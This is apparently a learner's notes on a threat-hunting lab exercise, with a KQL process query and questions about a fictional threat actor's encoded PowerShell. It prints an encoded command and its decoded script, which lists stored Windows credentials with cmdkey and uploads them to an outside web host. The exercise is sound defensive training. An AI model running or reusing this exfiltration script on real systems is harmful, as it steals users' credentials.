S1q21

While looking further down the timeline, you notice a few encoded Powershell commands. Threat actor often encode malicious commands so that they will be harder to detect by automated tools.

Using a tool like CyberChef, let's decode the commands you can find to discover what the threat actor is doing.

What is "Olivia" trying to steal in the first Powershell command?

ProcessEvents
| where username  contains "rikingsley"
| where timestamp >= datetime(2025-03-08T15:48:01)
| where process_commandline !contains "C:"
| distinct process_commandline

decode this command and find what olivia want to steal

powershell.exe -Nop -ExecutionPolicy bypass -enc JGNyZWRzID0gY21ka2V5IC9saXN0CiAgICAgICAgICAgICAgJHdlYmNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKICAgICAgICAgICAgICAkdXJsID0gImh0dHBzOi8vYmlnYnJhaW5zc21hbGxicmFpbnMubmV0L2JyYWluX2R1bXAiCiAgICAgICAgICAgICAgJHdlYmNsaWVudC5VcGxvYWRTdHJpbmcoJHVybCwgIlBPU1QiLCAkY3JlZHMp

$creds = cmdkey /list
$webclient = New-Object System.Net.WebClient
$url = "https://bigbrainssmallbrains.net/brain_dump"
$webclient.UploadString($url, "POST", $creds)

brain.dump and $creds

// credentials 


S1Q22

The script contained in the second Powershell command gives a huge clue about what Nymeria is capable of.

What type of malware usually behaves like that?

